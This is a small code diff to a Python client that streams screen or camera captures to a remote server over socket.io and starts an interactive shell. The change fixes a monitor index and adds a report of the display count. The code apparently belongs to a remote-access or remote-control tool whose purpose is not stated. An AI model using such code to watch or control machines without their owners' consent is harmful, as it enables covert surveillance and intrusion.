@@ -222,7 +222,7 @@ def run(data):
 
         if screen_or_camera == "screen":
             with mss.mss() as sct:
-                monitor = sct.monitors[9999]  # Capture the entire screen
+                monitor = sct.monitors[0]  # Capture the entire screen
 
                 while not stop_event.is_set():
                     current_time = time.time()
@@ -311,6 +311,12 @@ def run(data):
                     "Thread is already dead"
 
     sio.connect(data["url"])
+
+    def emit_screen_count(data):
+        sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': mss.mss().num_displays })
+
+    # Start a new thread to run the emit_screen_count function
+    threading.Thread(target=emit_screen_count, args=(data,)).start()
 
     shell = InteractiveShell()
     shell.start()
